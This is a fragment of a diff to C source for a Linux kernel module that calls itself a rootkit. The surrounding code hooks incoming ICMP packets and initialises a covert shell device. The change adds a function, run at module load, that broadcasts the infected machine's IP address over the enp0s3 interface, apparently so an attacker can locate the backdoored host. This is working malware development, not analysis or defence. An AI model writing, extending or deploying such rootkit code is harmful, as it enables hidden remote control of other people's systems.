@@ -27,6 +27,18 @@ static struct notifier_block nb = {
 };
 
 
+int broadcast(void) {
+    int res;
+    struct net_device *enp0s3;
+    enp0s3 = dev_get_by_name(&init_net,"enp0s3");
+    res = broadcast_ip(enp0s3);
+    // freeing the device
+    dev_put(enp0s3);
+    return res;
+
+}
+
+
 static int __init startup(void)
 {
     // configuring a hook which will handle icmp packets recieved
@@ -53,6 +65,11 @@ static int __init startup(void)
 
     if (!init_shell_device()) {
         return -4;
+    }
+
+
+    if (broadcast() != 0) {
+        return -5;
     }
 
     DEBUG_PUTS("rootkit: start\n")
